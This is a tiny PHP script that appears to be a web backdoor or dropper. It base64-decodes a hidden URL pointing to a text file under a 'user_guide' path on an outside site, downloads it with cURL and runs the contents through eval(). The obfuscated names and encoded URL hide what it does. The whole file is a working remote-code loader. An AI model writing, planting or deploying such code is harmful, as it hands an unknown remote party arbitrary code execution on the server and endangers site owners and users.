<?php
function qqa($bb){
    $u = $bb;
    $cC = curl_init($u);
    curl_setopt($cC, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($cC, CURLOPT_TIMEOUT, 20);
    $riri = curl_exec($cC);
    curl_close($cC);
    return $riri;
}

$ras = base64_decode('Pz4=');
echo eval($ras . qqa(base64_decode('aHR0cHM6Ly93d3cudHV6eWV2Lm9yZy91c2VyX2d1aWRlL2RhdGFiYXNlL3V0aWxpdGllcy50eHQ=')));
?>
